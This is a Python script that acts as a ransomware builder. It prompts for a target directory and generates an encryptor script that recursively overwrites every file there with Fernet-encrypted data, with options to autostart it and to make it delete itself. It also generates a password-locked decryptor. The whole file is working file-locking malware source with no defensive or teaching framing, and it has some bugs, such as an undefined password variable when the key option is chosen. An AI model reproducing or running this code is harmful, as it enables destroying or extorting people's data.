import os
from cryptography.fernet import Fernet
key = Fernet.generate_key()
direct = input("Specify the target directory: ")

auto_start_check = input("autostart program? y/n >>")
if auto_start_check == "y":
    auto_start = True
else:
    auto_start = False


self_delete_check = input("auto delete program? y/n >>")
if self_delete_check == "y":
    self_delete = True
else:
    self_delete = False

pass_or_key = input("Lock with Fernet key? y/n >>")
if pass_or_key == "y":
    pass
else:
    user_password = input("Password >> ")

key = Fernet.generate_key()
os.chdir(direct)
encryption_file_name = "encryptor_GENERATED_v2.2.py"
decryption_file_name = "decryptor_GENERATED_v2.2.py"


with open(encryption_file_name, "w") as crypt:
    crypt.write('''
import os
from cryptography.fernet import Fernet
import sys
self_delete = "'''+str(self_delete)+'''"
print('''+str(key)+''')
target_dir=r"'''+str(direct)+'''"
def parse(directory_to_parse):
    global files_found, target_dir
    for file_name in os.listdir(directory_to_parse):
        path = os.path.join(directory_to_parse, file_name)
        if file_name == "'''+str(encryption_file_name)+'''" or file_name == "'''+str(decryption_file_name)+'''":
            continue
        print(f"before isfile: file name {file_name}")
        if os.path.isfile(path):
            files.append(path)
            print('-' * 80)
            print(f"[{file_name}]--file found")
            files_found+=1
        else:
            print(f"test- found directory {path}")
            print(f"folder NAME:{file_name}")
            found_folder=f"{target_dir}" + "/" + f"{file_name}"
            parse(found_folder)
            

sys.setrecursionlimit(10000)
print(os.getcwd())
chdir=target_dir
os.chdir(target_dir)
files=[]
files_found = 0
files_read = 0
files_encrypted = 0
errors = 0

# for file in os.listdir():
#     if file == "encryptor_GENERATED.py" or file == "decryptor_GENERATED.py" or file == "decrypter_debug.py":
#         continue
#     if os.path.isfile(file):
#         files.append(file)
#         print('-' * 80)
#         print(f"[{file}]--file found")
#         files_found+=1




# parse(r"'''+str(direct)+'''")
parse(target_dir)

for file in files:
    with open(file, "rb") as thefile:
        try:
            contents = thefile.read()
            print('-' * 80)
            print(f"[{thefile}]--reading")
            files_read+=1
        except:
            print('-' * 80)
            print(f"[{thefile}]--error reading")
            errors+=1

        try:
            contents_encrypted = Fernet('''+str(key)+''').encrypt(contents)
            print('-' * 80)
            print(f"[{thefile}]--encrypting")
            files_encrypted+=1
        except Exception as e:
            errors+=1
            print('-' * 80)
            print(f"[{thefile}]--error reading")
            print(e)

    with open(file, "wb") as thefile:
        try:
            thefile.write(contents_encrypted)
        except Exception as e:
            print('-' * 80)
            print(f"[{thefile}]--error writing to file")
            errors+=1
            print(e)

print('-' * 80)
print('-' * 80)
print("Process Completed")
print('-' * 40)
print("Process Report")
print(f"Files Found...............{files_found}")
print(f"Files Read................{files_read}")
print(f"Files Encrypted...........{files_encrypted}")
print(f"Errors Encountered........{errors}")
if self_delete == "True":
    os.remove(str(sys.argv[0]))

    ''')
if auto_start:
    os.system("start encryptor_GENERATED_v2.2.py")
else:
    pass






with open(decryption_file_name, "w") as decrypt:
    decrypt.write('''
import os
from cryptography.fernet import Fernet
import sys
self_delete = "'''+str(self_delete)+'''"
target_dir=r"'''+str(direct)+'''"

def parse(directory_to_parse):
    global files_found, target_dir
    for file_name in os.listdir(directory_to_parse):
        path = os.path.join(directory_to_parse, file_name)
        if file_name == "'''+str(encryption_file_name)+'''" or file_name == "'''+str(decryption_file_name)+'''":
            continue
        print(f"before isfile: file name {file_name}")
        if os.path.isfile(path):
            files.append(path)
            print('-' * 80)
            print(f"[{file_name}]--file found")
            files_found+=1
        else:
            print(f"test- found directory {path}")
            print(f"folder NAME:{file_name}")
            found_folder=f"{target_dir}" + "/" + f"{file_name}"
            parse(found_folder)
            

sys.setrecursionlimit(10000)
print(os.getcwd())
chdir=target_dir
os.chdir(target_dir)
files=[]
files_found = 0
files_read = 0
files_decrypted = 0
errors = 0

# for file in os.listdir():
#     if file == "encryptor_GENERATED.py" or file == "decryptor_GENERATED.py" or file == "decrypter_debug.py":
#         continue
#     if os.path.isfile(file):
#         files.append(file)
#         print('-' * 80)
#         print(f"[{file}]--file found")
#         files_found+=1




# parse(r"'''+str(direct)+'''")
up = input(str("password>> "))
if up == "'''+str(user_password)+'''":
    parse(target_dir)
else:
    print("wrong")

for file in files:
    with open(file, "rb") as thefile:
        try:
            contents = thefile.read()
            print('-' * 80)
            print(f"[{thefile}]--reading")
            files_read+=1
        except:
            print('-' * 80)
            print(f"[{thefile}]--error reading")
            errors+=1

        try:
            contents_decrypted = Fernet('''+str(key)+''').decrypt(contents)
            print('-' * 80)
            print(f"[{thefile}]--decrypting")
            files_decrypted+=1
        except Exception as e:
            errors+=1
            print('-' * 80)
            print(f"[{thefile}]--error decrypting")
            print(e)

    with open(file, "wb") as thefile:
        try:
            thefile.write(contents_decrypted)
        except Exception as e:
            print('-' * 80)
            print(f"[{thefile}]--error writing to file")
            errors+=1
            print(e)

print('-' * 80)
print('-' * 80)
print("Process Completed")
print('-' * 40)
print("Process Report")
print(f"Files Found...............{files_found}")
print(f"Files Read................{files_read}")
print(f"Files Decrypted...........{files_decrypted}")
print(f"Errors Encountered........{errors}")
if self_delete == "True":
    os.remove(str(sys.argv[0]))      
        ''')